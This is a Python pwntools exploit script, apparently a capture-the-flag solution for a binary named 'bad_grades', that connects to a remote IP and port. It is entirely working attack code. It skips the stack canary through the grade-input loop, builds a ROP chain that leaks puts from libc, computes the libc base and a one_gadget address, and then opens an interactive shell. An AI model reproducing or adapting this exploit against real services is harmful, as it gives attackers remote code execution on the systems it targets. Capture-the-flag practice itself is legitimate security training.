#!/usr/bin/python3

from pwn import *
import struct
import binascii

context.arch = "amd64"
# context.log_level = "debug"

# 33 -> end of buffer
# 34 -> stack canary
# 35 -> rbp
# 36 -> rip (pop rdi ; ret)
# 37 -> puts@got
# 38 -> puts@plt
# 39 -> back_to_main

# p = process('./bad_grades')

p = remote('159.65.81.40', 30228)

elf = ELF('bad_grades')
libc = ELF('libc6_2.27-3ubuntu1.3_amd64.so')

def fill_the_buffer(grades):
	p.sendlineafter(b'> ', b'2')
	p.recv()
	p.sendline(f'{grades}'.encode())
	p.recv()
	for i in range(33):
		p.sendline(b'1')
		p.recv()
	p.sendline(b'.') # bypass canary
	p.recv()
	p.sendline(b'.') # bypass rbp
	p.recv()

def overwriting_target(target):
	r = p64(target)
	r = binascii.hexlify(r)
	result = struct.unpack('d', binascii.unhexlify(r))[0]
	return result

pop_rdi_ret = 0x401263 # pop rdi; ret
puts_at_got =  elf.got['puts'] # leaking puts
puts_at_plt = elf.plt['puts'] # calling puts
back_to_main = 0x401108 # back to main

fill_the_buffer(39)
p.sendline(f'{overwriting_target(pop_rdi_ret)}'.encode()) # overwriting rip
p.recv()
p.sendline(f'{overwriting_target(puts_at_got)}'.encode()) # puts_at_got in rdi
p.recv()
p.sendline(f'{overwriting_target(puts_at_plt)}'.encode()) # calling puts to leak puts address
p.recv()
p.sendline(f'{overwriting_target(back_to_main)}'.encode()) # going back to main
p.recvline()

l = u64(p.recvline()[:-1].ljust(8, b"\x00"))
log.success(f"leaked puts address = {hex(l)}")

base_address = l - int(0x080aa0)
log.success(f'base address = {hex(base_address)}')

one_gadget = base_address + int(0x4f432)
log.success(f'one_gadget = {hex(one_gadget)}')

fill_the_buffer(36)
p.sendline(f'{overwriting_target(one_gadget)}'.encode())
p.recv()

p.interactive()
